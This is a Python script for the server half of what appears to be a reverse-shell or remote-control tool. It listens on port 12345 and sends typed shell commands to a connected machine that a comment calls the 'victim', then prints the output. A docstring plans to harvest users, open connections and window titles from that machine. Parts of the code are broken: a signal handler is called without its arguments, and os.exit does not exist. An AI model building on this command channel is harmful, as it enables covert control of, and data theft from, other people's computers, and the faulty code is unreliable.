import socket
import sys
import os
import psutil
from time import sleep
'''
Server need to implement following methods:
    [*] Periodic tasks on the system
    [*] Users and groups
    [*] System up time
    [*] Open connections
    [*] Open windows titles
'''
# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 12345
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)

def socket_accept():
    conn, address = s.accept() # return sock, address
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    cmd_commands(conn)
    conn.close()

# Send commands to client/victim or a friend
# Send to client which command to execute and wait for result
def cmd_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024),"utf-8")
                print(client_response, end="")
        except KeyboardInterrupt:
            signal_handler()






def main():
    create_socket()
    bind_socket()
    socket_accept()

def signal_handler(signum, frame):
    command = input("Want to exit? (Y/N)")
    if command == "Y":
        os.exit()
    else:
        socket_accept()


main()







